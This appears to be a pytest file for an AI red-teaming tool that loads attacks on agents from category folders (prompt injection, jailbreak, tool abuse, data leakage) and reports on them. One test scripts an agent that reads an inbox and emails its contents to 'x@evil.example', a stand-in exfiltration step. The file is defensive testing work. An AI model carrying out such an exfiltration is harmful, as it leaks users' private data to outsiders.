"""Categories are discovered from the folders under attacks/."""

import io
import json
from pathlib import Path

import pytest

from lure import cli
from lure.attacks import (
    AttackError,
    attacks_root,
    category_folder,
    discover_categories,
    load_attack,
)
from lure.batch import collect_attack_paths
from lure.report.data import build_report, load_runs
from lure.report.exec_summary import DEFAULT_GUARDRAIL, exec_summary
from lure.report.techniques import category_name
from lure.runner import run_attack
from tests.fakes import ScriptedAdapter, call, say
from tests.test_attacks import INBOX, variant, write
from tests.test_policy import Idle

REPO = Path(__file__).resolve().parent.parent
SHIPPED = ["data_leakage", "direct_prompt_injection", "indirect_prompt_injection",
           "jailbreak", "tool_abuse", "tool_poisoning"]


@pytest.fixture
def repo(tmp_path):
    (tmp_path / "fixtures").mkdir()
    (tmp_path / "fixtures" / "inbox.json").write_text(json.dumps(INBOX))
    return tmp_path


def new_category(repo):
    """A category no code knows about: just a folder and an attack in it."""
    return write(repo, variant(id="lure-sup-001", category="supply_chain"),
                 category="supply_chain")


def test_shipped_categories_are_the_folders():
    assert discover_categories(REPO / "attacks") == SHIPPED


def test_a_new_folder_is_a_new_category(repo):
    path = new_category(repo)
    assert load_attack(path).category == "supply_chain"
    assert "supply_chain" in discover_categories(repo / "attacks")
    assert path in collect_attack_paths(repo / "attacks")
    assert category_name("supply_chain") == "Supply chain"


def test_folders_without_attacks_are_not_categories(repo):
    (repo / "attacks" / "empty").mkdir(parents=True)
    (repo / "attacks" / "notes").mkdir()
    (repo / "attacks" / "notes" / "README.md").write_text("x")
    new_category(repo)
    assert discover_categories(repo / "attacks") == ["supply_chain"]


def test_category_must_match_its_folder(repo):
    path = write(repo, variant(category="supply_chain"))
    with pytest.raises(AttackError, match="does not match folder 'indirect_prompt_injection'"):
        load_attack(path)


def test_nested_folders_use_the_top_category(repo):
    path = write(repo, variant(), category="indirect_prompt_injection/email")
    assert category_folder(path) == "indirect_prompt_injection"
    assert load_attack(path).category == "indirect_prompt_injection"


def test_loose_file_in_attacks_is_rejected(repo):
    path = repo / "attacks" / "lure-ipi-900.yaml"
    write(repo, variant()).rename(path)
    with pytest.raises(AttackError, match="go in a category folder"):
        load_attack(path)


def test_file_outside_attacks_takes_any_category(repo):
    path = write(repo, variant(category="supply_chain"), category="x")
    outside = repo / "lure-ipi-900.yaml"
    path.rename(outside)
    assert category_folder(outside) is None
    assert load_attack(outside, root=repo).category == "supply_chain"


def test_attacks_root():
    assert attacks_root(REPO / "attacks" / "jailbreak") == REPO / "attacks"
    assert attacks_root(REPO / "attacks" / "jailbreak" / "lure-jbk-001.yaml") == REPO / "attacks"
    assert attacks_root(REPO / "fixtures") is None


# The CLI


def run(repo, attack, *extra):
    out = io.StringIO()
    code = cli.main(["run", str(attack), "--target", "ollama",
                     "--results-dir", str(repo / "results"), *extra], out=out)
    return code, out.getvalue()


@pytest.fixture
def idle(monkeypatch):
    monkeypatch.setattr(cli, "make_adapter", lambda target, model: Idle("idle"))


def test_folder_run_includes_a_new_category(repo, idle):
    new_category(repo)
    write(repo, variant())
    run(repo, repo / "attacks", "--no-policy")
    ids = sorted(json.loads(p.read_text())["attack"]["category"]
                 for p in (repo / "results").glob("*.json"))
    assert ids == ["indirect_prompt_injection", "supply_chain"]


def test_policy_can_enable_a_new_category(repo, idle):
    new_category(repo)
    write(repo, variant())
    policy = repo / "p.yaml"
    policy.write_text("categories: [supply_chain]\n")
    run(repo, repo / "attacks", "--policy", str(policy))
    [saved] = (repo / "results").glob("*.json")
    assert json.loads(saved.read_text())["attack"]["id"] == "lure-sup-001"


def test_policy_naming_a_missing_category_is_bad_input(repo, idle, capsys):
    write(repo, variant())
    policy = repo / "p.yaml"
    policy.write_text("categories: [indirect_prompt_injection, tool_abuse]\n")
    code, _ = run(repo, repo / "attacks" / "indirect_prompt_injection", "--policy", str(policy))
    assert code == cli.EXIT_ERROR
    assert "categories ['tool_abuse'] have no folder under" in capsys.readouterr().err



def test_new_category_gets_the_default_guardrail(repo):
    attack = load_attack(new_category(repo))
    run_attack(attack, ScriptedAdapter(
        call("read_inbox"),
        call("send_email", "c2", to=["x@evil.example"], subject="s", body="b"),
        say("Sent."))).save(repo / "results")
    bullets = exec_summary(build_report(load_runs([repo / "results"])))
    assert bullets[-1] == f"Recommended guardrail: {DEFAULT_GUARDRAIL}"
